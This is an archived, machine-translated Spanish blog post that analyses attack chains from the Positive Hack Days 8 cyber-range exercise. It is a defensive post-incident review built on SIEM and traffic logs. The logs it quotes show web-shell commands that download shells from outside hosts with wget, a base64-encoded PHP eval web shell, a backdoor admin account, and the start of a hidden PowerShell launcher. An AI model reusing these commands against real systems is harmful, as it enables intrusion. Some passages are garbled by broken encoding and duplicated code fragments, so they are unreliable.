<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>‚Ñ¢Ô∏è üë®üèæ‚Äçüéì ü§¥üèª Enfrentamiento en Positivo Hack Days 8: an√°lisis de cadenas de ataque üì¥ üë®üèø‚Äçüè≠ ü§ó</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Entonces, la siguiente "confrontaci√≥n" termin√≥ en los d√≠as de Hack Positivo 8. Esta vez, m√°s de cien personas participaron en la lucha: 12 equipos de ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Enfrentamiento en Positivo Hack Days 8: an√°lisis de cadenas de ataque</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/418335/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><img src="https://habrastorage.org/webt/lv/ma/od/lvmaodafe3q0xv0wflk--q_xae4.png"></a> <br><br>  Entonces, la siguiente "confrontaci√≥n" termin√≥ en los d√≠as de Hack Positivo 8. Esta vez, m√°s de cien personas participaron en la lucha: 12 equipos de atacantes, 8 equipos de defensores y una ciudad entera que tuvieron que atacar y defender. <a name="habracut"></a><br><br>  Esta vez, The Standoff cont√≥ con la presencia no solo de equipos de atacantes y defensores, sino que los tres productos de nuestra compa√±√≠a observaron todo lo que sucedi√≥ en la red de juegos: <br><br><ul><li>  <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">MaxPatrol SIEM</a></b> - sistema SIEM. </li><li>  <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">PT Network Attack Discovery</a></b> es una soluci√≥n de seguridad de red para analizar el tr√°fico de red, identificar e investigar incidentes. </li><li>  <b><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">PT MultiScanner</a></b> es un sistema de niveles m√∫ltiples para detectar y bloquear contenido malicioso. </li></ul><br>  Los tres productos fueron monitoreados por el equipo del centro de expertos en seguridad de Positive Technologies (PT ESC), que monitorea las tendencias y eventos del juego para informar a los visitantes del centro de expertos sobre esto. <br><br>  Esta fue la primera participaci√≥n de este tipo de un equipo de expertos y productos y mostraron su mejor lado: hab√≠a tantos datos que ser√≠an suficientes para un gran informe.  Las redes de la oficina # 2 de la compa√±√≠a integradora SPUTNIK y la oficina # 1 de la compa√±√≠a de seguros BeHealthy resultaron ser las m√°s interesantes y completas por descripci√≥n.  La Oficina No. 2 fue interesante porque estaba bajo la supervisi√≥n del SOC RTK, pero no fue atendida por un equipo de defensores y fue atacada por completo por los equipos atacantes. <br><br>  Perm√≠tanme recordarles que, adem√°s de dos oficinas, la ciudad ten√≠a una estaci√≥n de energ√≠a t√©rmica y una subestaci√≥n, ferrocarril, hogares inteligentes con recuperaci√≥n de energ√≠a y bancos con cajeros autom√°ticos. <br><br><img src="https://habrastorage.org/webt/ki/99/iq/ki99iqb0x5sdfk5d_am3faotusu.png"><br><br>  <i>Infraestructura de juego</i> <br><br>  La forma en que se analizaron los eventos en las oficinas n. ¬∞ 1 y n. ¬∞ 2 a trav√©s del prisma de MaxPatrol SIEM, PT NAD y PT MultiScanner con √©nfasis en los detalles t√©cnicos del pirateo. <br><br>  Diagrama l√≥gico de una oficina de red de juegos # 2: <br><br><img src="https://habrastorage.org/webt/m4/fw/um/m4fwumpq3cljrqs-6r1qjh5kp5q.png"><br><br>  Dirigirse a los equipos atacantes es 172.31.x.0 / 24, donde x es el n√∫mero de comando del 1 al 8. De hecho, hab√≠a 12 equipos en total, pero debido a la arquitectura de la infraestructura de red de la red (el n√∫cleo de la red se emul√≥ en Cisco CSR1000v) y el f√≠sico equipo, fue posible organizar solo 8 interfaces de red f√≠sicas que se cambiaron para equipos en toda el √°rea de juego.  Por lo tanto, en cuatro redes, se ubicaron dos equipos. <br><br>  En la infraestructura de Office # 2, se asignaron cuatro segmentos de red: <br><br><ul><li>  DMZ (100.64.154.0/25); </li><li>  servidores (10.106.60.0/24); </li><li>  Empleados de la empresa (10.106.50.0/24); </li><li>  equipo defensor (10.106.82.0/24). </li></ul><br>  Los nodos ubicados en la zona desmilitarizada eran accesibles a trav√©s de la red para todos los atacantes.  Al acceder a estos nodos, las direcciones de red reales de los comandos NAT proven√≠an del grupo 100.110.255.0/24, por lo que para los defensores no fue f√°cil averiguar qui√©n posee este o aquel tr√°fico de red: este podr√≠a ser uno de los 12 equipos atacantes o un verificador de script leg√≠timo, comprobar la capacidad de servicio de los servicios del mismo grupo de direcciones que los atacantes. <br><br>  Para llenar nuestros productos con eventos sobre lo que est√° sucediendo en la infraestructura de juegos, organizamos la eliminaci√≥n y la redirecci√≥n de una copia de todo el tr√°fico de red en PT NAD, as√≠ como tambi√©n configuramos una auditor√≠a extendida de los eventos de los sistemas de destino y organizamos su entrega a MaxPatrol SIEM. <br><br>  El an√°lisis de los ataques con √©nfasis en los equipos se puede encontrar en nuestro otro <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">informe sobre Habr</a> . <br><br><h2>  Joomla (100.64.154.147) </h2><br>  Uno de los servidores en la oficina DMZ # 2 era un servidor con Joomla CMS.  Unas pocas horas despu√©s del inicio del juego, aparecieron los primeros signos de compromiso de este servidor en PT NAD: relleno de shell web del grupo de direcciones IP "grises": <br><br><img src="https://habrastorage.org/webt/pj/jq/fr/pjjqfrt_2jdv_fwplypyzlmhwcg.png"><br><br>  Como se mencion√≥, todas las subredes de los equipos atacantes se terminaron en el mismo ME (Attacker-FW) y al crear una conexi√≥n con los objetos atacados, las direcciones IP de los atacantes se tradujeron en direcciones IP grises de un solo grupo (100.110.255.0/24).  Por lo tanto, para la personificaci√≥n de ataques por comandos, se implement√≥ un esquema con el enriquecimiento de las puertas de enlace de acuerdo con la tabla NAT de este ME.  En el marco de MP SIEM, el enriquecimiento fue el siguiente: <br><br><img src="https://habrastorage.org/webt/bk/4d/7s/bk4d7szltcyuzoywpodadcszg3c.png"><br><br>  Este enfoque nos permiti√≥ determinar que este ataque fue iniciado por el equipo # 1.  Sin embargo, debido al uso del mismo grupo de direcciones por parte de diferentes equipos, no podemos determinar de manera confiable el nombre del equipo a pedido de una red en particular, y con el prop√≥sito de una mayor narraci√≥n nombraremos a los equipos por sus n√∫meros de red. <br><br>  Una hora despu√©s de probar el comando n. ¬∞ 1, PT NAD not√≥ que el comando n. ¬∞ 8 se estaba cargando en otro shell web con el nombre de voz SHE __. El comando establece una sesi√≥n ssh de un usuario usuario sin privilegios. <br><br><img src="https://habrastorage.org/webt/xp/zp/6h/xpzp6hvlbykhamirlmbhoxm2lm0.png"><br><br><img src="https://habrastorage.org/webt/bd/cc/mx/bdccmxlsasdvx5avlabnoxqgm44.png"><br><br>  La contrase√±a para esta cuenta estaba en la parte superior del diccionario rockyou y coincid√≠a.  El acceso a la cuenta ra√≠z para el 8vo equipo apareci√≥ solo alrededor de las 4:00 p.m. debido a la membres√≠a del usuario en el grupo con el derecho de ejecutar comandos sin contrase√±a desde la ra√≠z.  Podemos estar convencidos de esto en los registros MP SIEM, que nos informan sobre el primer inicio de sesi√≥n como usuario usuario y luego sobre la escalada de privilegios con el comando sudo. <br><br><img src="https://habrastorage.org/webt/s4/jz/2m/s4jz2m3zuf1mirhsdhjrdfu9ug8.png"><br><img src="https://habrastorage.org/webt/nl/wq/la/nlwqlabrbzuu3vnjrtzbuo0qaro.png"><br><br>  El tiempo de registro puede variar en 3 horas debido a la configuraci√≥n del servidor del juego. <br><br>  En la tarde del primer d√≠a de la confrontaci√≥n, el sexto equipo tom√≥ posesi√≥n de Joomla.  NAD descubri√≥ la explotaci√≥n de una vulnerabilidad, o m√°s bien, una <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">caracter√≠stica a</a> trav√©s de la cual el equipo carg√≥ el conocido shell web WSO y comenz√≥ a interactuar con √©l. <br><br><img src="https://habrastorage.org/webt/ts/il/um/tsilumlbi-mfrbehbf8vo1dcjfo.png"><br><br><pre><code class="hljs powershell"><span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">31</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] GET /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">35</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.160</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">35</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] GET /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.220</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span>:<span class="hljs-number"><span class="hljs-number">56</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP ‚Ä¶ <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.32</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">39</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.118</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">43</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] POST /templates/beez3/index.php HTTP <span class="hljs-number"><span class="hljs-number">100.110</span></span>.<span class="hljs-number"><span class="hljs-number">255.145</span></span> - - [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">09</span></span>:<span class="hljs-number"><span class="hljs-number">44</span></span>:<span class="hljs-number"><span class="hljs-number">49</span></span> -<span class="hljs-number"><span class="hljs-number">0700</span></span>] GET /templates/beez3/index.php HTTP</code> </pre> <br>  Vale la pena se√±alar que el script que usaban los comandos para llenar los shells, <br>  requiere una cuenta de administrador, cuya contrase√±a se seleccion√≥ utilizando otra <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">vulnerabilidad</a> CVE-2017-14596 en el mecanismo de autenticaci√≥n en Joomla a trav√©s de LDAP: al cambiar la solicitud de autenticaci√≥n LDAP, los atacantes recogen r√°pidamente el inicio de sesi√≥n y la contrase√±a de la cuenta de administrador. <br><br>  Y despu√©s de media hora tomaron el control de todo el sistema. <br><br><img src="https://habrastorage.org/webt/0f/mb/kh/0fmbkhezemjgbqpk33mmdrypg70.png"><br><br>  Los equipos atacantes utilizaron la m√°quina capturada para realizar m√°s reconocimientos en la red de la segunda oficina SPUTNIK con las utilidades nmap y hping3.  Podemos tener una idea de sus acciones a partir de los datos MP SIEM: <br><br><img src="https://habrastorage.org/webt/tb/o2/lz/tbo2lzwokr5rloy_7ykz8klyywg.png"><br><img src="https://habrastorage.org/webt/vn/nr/o4/vnnro4qzj6jwsw8snzzpmfpu8gy.png"><br><br>  Ejemplo de la red de oficinas de inteligencia DMZ 2 (100.64.154.0/24) y la red del equipo defensor (10.106.82.0/24): <br><br><img src="https://habrastorage.org/webt/ne/bu/dr/nebudriyumef2zbdsigm2ncyqqm.png"><br><img src="https://habrastorage.org/webt/tv/6u/ay/tv6uaynn7krj_ls6snexal-nu3g.png"><br><br>  A las 21:17, encontramos que el cliente OpenVPN estaba instalado y lanzado en el servidor de Joomla.  La conexi√≥n se estableci√≥ con el servidor 195.16.61.229, ubicado en Mosc√∫.  Un poco m√°s tarde, descubrimos que estas acciones fueron realizadas por miembros del equipo # 6 y, por lo tanto, el equipo logr√≥ atraer recursos inform√°ticos y humanos adicionales ubicados en un sitio remoto. <br><br>  Toda la interacci√≥n con el sitio remoto se llev√≥ a cabo dentro del t√∫nel protegido, por lo que es imposible establecer la naturaleza de esta interacci√≥n y el grado de su influencia en el juego.  Solo podemos sacar conclusiones indirectas, en funci√≥n del n√∫mero de sesiones de VPN y la cantidad de datos transferidos. <br><br><img src="https://habrastorage.org/webt/iw/ce/c4/iwcec4-s1rj715wnjapvtqgivza.png"><br><br>  Pero lo m√°s interesante es que el equipo no limpi√≥ los rastros: despu√©s del juego, encontramos en el servidor ovpn una configuraci√≥n que contiene los certificados ra√≠z y personales, la clave privada y los datos personales del propietario de la clave.  Si utiliza un motor de b√∫squeda, no es nada dif√≠cil determinar la identidad real del propietario bajo el apodo phonexicum.  El mapa completo con todas las conexiones VPN durante el juego se puede examinar al final del art√≠culo. <br><br>  Otros eventos interesantes comenzaron a desarrollarse despu√©s de la medianoche (+3 horas a los registros). <br>  Shell /id.php comando # 4 encuentra el comando # 1: <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">58</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php HTTP/1.1 [15/May/2018:21:58:24 +0000] "</span></span>GET /id.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">58</span></span>:<span class="hljs-number"><span class="hljs-number">34</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?c=ls HTTP/1.1 [15/May/2018:21:58:38 +0000] "</span></span>GET /id.php?cmd=ls HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">21</span></span>:<span class="hljs-number"><span class="hljs-number">59</span></span>:<span class="hljs-number"><span class="hljs-number">53</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=id HTTP/1.1 [15/May/2018:21:59:56 +0000] "</span></span>GET /id.php?cmd=ls+<span class="hljs-literal"><span class="hljs-literal">-la</span></span> HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/bb/1j/z7/bb1jz7fidnpbep9o-lxcqmdwoou.png"><br><img src="https://habrastorage.org/webt/4u/or/jj/4uorjjrsmjk1kzlautfduvh8gtq.png"><br><br>  E inmediatamente se fortalece en el sistema, preservando el shell web de WSO con el nombre 123.php <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">05</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=wget HTTP/1.1 [15/May/2018:22:00:10 +0000] "</span></span>GET /id.php?cmd=wget <span class="hljs-literal"><span class="hljs-literal">-h</span></span> HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">15</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">22</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">53</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=cat index.php HTTP/1.1 [15/May/2018:22:01:04 +0000] "</span></span>GET /id.php?cmd=wget http://txt.<span class="hljs-number"><span class="hljs-number">731</span></span>my.com/wso.txt <span class="hljs-literal"><span class="hljs-literal">-o</span></span> <span class="hljs-number"><span class="hljs-number">123</span></span>.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/uu/yf/sb/uuyfsboyntyyavtzwwh4diilju8.png"><br><img src="https://habrastorage.org/webt/1i/rb/7f/1irb7fdixxk8cdoblvtn7hkldlm.png"><br><br>  El primer equipo fue anfitri√≥n hasta que el equipo # 4 descubri√≥ esto unas horas m√°s tarde y, despu√©s de una breve discusi√≥n, cambia el nombre del shell id.php a 021371b392f0b42398630fd668adff5d.php <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">13</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=id HTTP/1.1 [16/May/2018:00:06:26 +0000] "</span></span>GET /id.php?cmd=ls HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">07</span></span>:<span class="hljs-number"><span class="hljs-number">16</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] <span class="hljs-string"><span class="hljs-string">"GET /id.php?cmd=mv id.php 021371b392f0b42398630fd668adff5d.php HTTP/1.1</span></span></code> </pre><br>  Posteriormente, 021371b392f0b42398630fd668adff5d.php fue reemplazado por kekekeke.php y kekpek.php <br><br><pre> <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo <span class="hljs-string"><span class="hljs-string">"&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;"</span></span> &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span>.<span class="hljs-number"><span class="hljs-number">190.162</span></span>/kek.php <span class="hljs-literal"><span class="hljs-literal">-O</span></span> kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> (base64_decode (ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr ( <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo <span class="hljs-string"><span class="hljs-string">"&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;"</span></span> &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span>.<span class="hljs-number"><span class="hljs-number">190.162</span></span>/kek.php <span class="hljs-literal"><span class="hljs-literal">-O</span></span> kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> &gt; Kekekeke.php HTTP <code class="hljs powershell">[<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">00</span></span>:<span class="hljs-number"><span class="hljs-number">41</span></span>:<span class="hljs-number"><span class="hljs-number">23</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=echo <span class="hljs-string"><span class="hljs-string">"&lt;?phpeval(base64_decode(ailYmWoCX2oBXg8FSJdSxwQkAgAd3UiJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf.chr(47).m));?&gt;"</span></span> &gt; kekekeke.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> [<span class="hljs-number"><span class="hljs-number">16</span></span>/<span class="hljs-type"><span class="hljs-type">May</span></span>/<span class="hljs-number"><span class="hljs-number">2018</span></span>:<span class="hljs-number"><span class="hljs-number">06</span></span>:<span class="hljs-number"><span class="hljs-number">20</span></span>:<span class="hljs-number"><span class="hljs-number">52</span></span> +<span class="hljs-number"><span class="hljs-number">0000</span></span>] GET /<span class="hljs-number"><span class="hljs-number">021371</span></span>b392f0b42398630fd668adff5d.php?cmd=wget%<span class="hljs-number"><span class="hljs-number">20193.124</span></span>.<span class="hljs-number"><span class="hljs-number">190.162</span></span>/kek.php <span class="hljs-literal"><span class="hljs-literal">-O</span></span> kekpek.php HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/rx/ei/zf/rxeizfxenzfe2cxwf1xuuc8bwzk.png"><br><br>  Los siguientes eventos en la infraestructura de dominio de la oficina # 2 SPUTNIK est√°n estrechamente relacionados con lo que est√° sucediendo en Jumla. <br><br><h2>  SPUTNIK (10.106.60.0/24) </h2><br>  Despu√©s de que Joomla fue perforado, el atacante obtuvo acceso a los segmentos internos de la infraestructura SPUTNIK (Oficina # 2).  Sin pensarlo dos veces, el exploit MS17-010 vuela al controlador de dominio WIN2008R2-DC.domain2.phd (10.106.60.10). <br><br><img src="https://habrastorage.org/webt/ok/iw/xo/okiwxohg5xsajx_kpbq3muhbwss.png"><br><br>  Es m√°s conveniente observar la cronolog√≠a de otros eventos por los desencadenantes de MP SIEM: <br><br><img src="https://habrastorage.org/webt/pe/b3/dc/peb3dct4qumtok5vppa_awaxxgg.png"><br><img src="https://habrastorage.org/webt/ad/vn/ul/advnuld4auuorgtjbnxb3h3itxy.png"><br><br>  El primer paso del atacante fue crear un usuario con el nombre "nombre de usuario" y la contrase√±a "1qazzaq!"  y agregarlo al grupo de administradores locales (pantalla # 2).  La explotaci√≥n exitosa de exploits desde MS17-010 da acceso con privilegios NT-Authority \ System y en los registros de Windows dicho acceso se muestra como win2008r2-dc $. <br><br><img src="https://habrastorage.org/webt/xb/p7/hv/xbp7hvoec-1pl8spi8mso-hj-qo.png"><br><img src="https://habrastorage.org/webt/eg/kw/zp/egkwzpqyruruxatatp4ikdlqkyy.png"><br><img src="https://habrastorage.org/webt/mu/ei/c9/mueic9dlqmeodoln-b88gzhoywq.png"><br><br>  En nombre del nuevo usuario, crea un par de servicios que ejecutan un determinado script de PowerShell: <br><br><pre> <code class="hljs powershell">%COMSPEC% /b /c start /b /min powershell.exe <span class="hljs-literal"><span class="hljs-literal">-nop</span></span> <span class="hljs-literal"><span class="hljs-literal">-w</span></span> <span class="hljs-keyword"><span class="hljs-keyword">hidden</span></span> <span class="hljs-literal"><span class="hljs-literal">-noni</span></span> <span class="hljs-literal"><span class="hljs-literal">-c</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>([<span class="hljs-built_in"><span class="hljs-built_in">Int</span></span><span class="hljs-type"><span class="hljs-type">Ptr</span></span>]::Size <span class="hljs-operator"><span class="hljs-operator">-eq</span></span> <span class="hljs-number"><span class="hljs-number">4</span></span>){<span class="hljs-variable"><span class="hljs-variable">$b</span></span>=<span class="hljs-variable"><span 